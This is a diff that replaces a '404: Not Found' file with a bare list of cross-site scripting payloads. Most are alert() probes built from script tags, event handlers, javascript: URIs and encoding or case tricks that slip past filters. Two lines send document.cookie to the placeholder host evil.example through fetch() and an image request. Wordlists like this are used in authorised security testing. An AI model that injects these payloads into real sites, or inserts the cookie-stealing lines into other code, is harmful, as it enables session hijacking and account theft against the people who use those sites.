@@ -1,1 +1,40 @@
-404: Not Found
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+javascript:alert(1)
+<a href="javascript:alert(1)">x</a>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<x onclick=alert(1)>click</x>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<script>fetch('//evil.example/?c='+document.cookie)</script>
+<script>new Image().src='//evil.example/?c='+document.cookie</script>
+'"><svg/onload=alert(String.fromCharCode(88,83,83))>
+<img src=x oNeRrOr=alert(1)>
+<ScRiPt>alert(1)</ScRiPt>
+<img src=x:alert(alt) onerror=eval(src) alt=1>
+<%2Fscript><script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+<div style="background:url(javascript:alert(1))">
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<form action=javascript:alert(1)><input type=submit>
+"onmouseover="alert(1)
+" autofocus onfocus=alert(1) x="
